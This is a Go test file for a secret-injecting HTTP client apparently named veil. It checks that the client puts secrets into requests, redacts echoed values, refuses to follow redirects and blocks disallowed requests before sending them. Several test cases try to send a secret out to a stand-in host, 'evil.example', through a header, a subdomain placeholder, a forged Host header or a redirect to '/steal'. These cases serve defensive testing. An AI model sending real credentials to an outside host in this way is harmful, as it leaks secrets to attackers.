package httpinject

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/moomdate/veil/internal/policy"
	"github.com/moomdate/veil/internal/redact"
	"github.com/moomdate/veil/internal/secret"
	"github.com/moomdate/veil/internal/vault"
)

const canary = "sk_test_canary_4b8e2f91"

type fixture struct {
	srv      *httptest.Server
	hits     atomic.Int32
	lastAuth atomic.Value
	lastBody atomic.Value
	secrets  []secret.Secret
}

func newFixture(t *testing.T) *fixture {
	f := &fixture{}
	f.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		f.hits.Add(1)
		f.lastAuth.Store(r.Header.Get("Authorization"))
		b, _ := io.ReadAll(r.Body)
		f.lastBody.Store(string(b))
		switch r.URL.Path {
		case "/echo":
			// A server that reflects the credential back, as some error pages do.
			w.Header().Set("X-Echo", r.Header.Get("Authorization"))
			fmt.Fprintf(w, "you sent %s and %s", r.Header.Get("Authorization"), r.URL.Query().Get("key"))
		case "/redirect":
			http.Redirect(w, r, "https://evil.example/steal", http.StatusFound)
		default:
			fmt.Fprint(w, "ok")
		}
	}))
	t.Cleanup(f.srv.Close)
	host := mustHost(f.srv.URL)
	f.secrets = []secret.Secret{
		{Name: "API_KEY", Value: secret.NewValue(canary), Tier: secret.Scoped, Domains: []string{host}, AllowIn: []string{secret.InHeader, secret.InURL, secret.InBody}},
		{Name: "HEADER_KEY", Value: secret.NewValue("header-only-value-1"), Tier: secret.Scoped, Domains: []string{host}},
		{Name: "OTHER_KEY", Value: secret.NewValue("other-value-123"), Tier: secret.Scoped, Domains: []string{"api.elsewhere.com"}},
		{Name: "SHELL_KEY", Value: secret.NewValue("basic-value-123"), Tier: secret.Basic},
	}
	return f
}

func mustHost(raw string) string {
	u, _ := url.Parse(raw)
	return u.Hostname()
}

func (f *fixture) lookup(name string) (secret.Secret, error) {
	for _, s := range f.secrets {
		if s.Name == name {
			return s, nil
		}
	}
	return secret.Secret{}, fmt.Errorf("%s: %w", name, vault.ErrNotFound)
}

func (f *fixture) do(req Request) (Response, error) {
	return Do(context.Background(), NewClient(), req, f.lookup, redact.New(f.secrets))
}

func TestInjectsIntoHeaderAndBody(t *testing.T) {
	f := newFixture(t)
	resp, err := f.do(Request{
		Method:  "POST",
		URL:     f.srv.URL + "/ok",
		Headers: map[string]string{"Authorization": "Bearer {{secret:API_KEY}}"},
		Body:    `{"key":"{{ secret:API_KEY }}"}`,
	})
	if err != nil {
		t.Fatal(err)
	}
	if resp.Status != 200 || resp.Body != "ok" {
		t.Fatalf("resp = %+v", resp)
	}
	if got := f.lastAuth.Load(); got != "Bearer "+canary {
		t.Fatalf("server got Authorization %q", got)
	}
	if got := f.lastBody.Load(); got != `{"key":"`+canary+`"}` {
		t.Fatalf("server got body %q", got)
	}
}

func TestEchoedSecretIsHidden(t *testing.T) {
	f := newFixture(t)
	resp, err := f.do(Request{
		URL:     f.srv.URL + "/echo?key={{secret:API_KEY}}",
		Headers: map[string]string{"Authorization": "{{secret:API_KEY}}"},
	})
	if err != nil {
		t.Fatal(err)
	}
	dump := fmt.Sprintf("%+v", resp)
	if strings.Contains(dump, canary) {
		t.Fatalf("value leaked in response: %s", dump)
	}
	if resp.Hidden < 3 {
		t.Errorf("Hidden = %d, want at least 3 (body x2, header)", resp.Hidden)
	}
}

func TestBlockedBeforeSending(t *testing.T) {
	f := newFixture(t)
	cases := map[string]Request{
		"host not allowed":        {URL: "https://evil.example/x", Headers: map[string]string{"A": "{{secret:API_KEY}}"}},
		"secret for other host":   {URL: f.srv.URL, Headers: map[string]string{"A": "{{secret:OTHER_KEY}}"}},
		"basic secret":            {URL: f.srv.URL, Headers: map[string]string{"A": "{{secret:SHELL_KEY}}"}},
		"placeholder in host":     {URL: "https://{{secret:API_KEY}}.evil.example/"},
		"placeholder header name": {URL: f.srv.URL, Headers: map[string]string{"{{secret:API_KEY}}": "x"}},
		"host header":             {URL: f.srv.URL, Headers: map[string]string{"Host": "evil.example"}},
		"unknown secret":          {URL: f.srv.URL, Headers: map[string]string{"A": "{{secret:NOPE}}"}},
		"relative url":            {URL: "/v1/things"},
		"header-only in body":     {URL: f.srv.URL, Body: `{"files":{"x":{"content":"{{secret:HEADER_KEY}}"}}}`},
		"header-only in url":      {URL: f.srv.URL + "/?k={{secret:HEADER_KEY}}"},
	}
	for name, req := range cases {
		_, err := f.do(req)
		if err == nil {
			t.Errorf("%s: expected an error", name)
		}
		if err != nil && strings.Contains(err.Error(), canary) {
			t.Errorf("%s: error leaked the value: %v", name, err)
		}
	}
	if n := f.hits.Load(); n != 0 {
		t.Fatalf("server received %d requests; blocked requests must never be sent", n)
	}
	_, err := f.do(Request{URL: "https://evil.example/", Headers: map[string]string{"A": "{{secret:API_KEY}}"}})
	if !errors.Is(err, policy.ErrDenied) {
		t.Errorf("host denial should wrap policy.ErrDenied, got %v", err)
	}
}

func TestRedirectNotFollowed(t *testing.T) {
	f := newFixture(t)
	resp, err := f.do(Request{URL: f.srv.URL + "/redirect", Headers: map[string]string{"X-Api-Key": "{{secret:API_KEY}}"}})
	if err != nil {
		t.Fatal(err)
	}
	if resp.Status != http.StatusFound {
		t.Fatalf("status = %d; redirects must not be followed", resp.Status)
	}
	if resp.Headers["Location"] != "https://evil.example/steal" {
		t.Fatalf("Location header should be passed back, got %q", resp.Headers["Location"])
	}
}

func TestReferenced(t *testing.T) {
	got := Referenced(Request{
		URL:     "https://x/{{secret:A}}",
		Headers: map[string]string{"h": "{{secret:B}} {{secret:A}}"},
		Body:    "{{secret:C}}",
	})
	if strings.Join(got, ",") != "A,B,C" {
		t.Fatalf("Referenced = %v", got)
	}
}
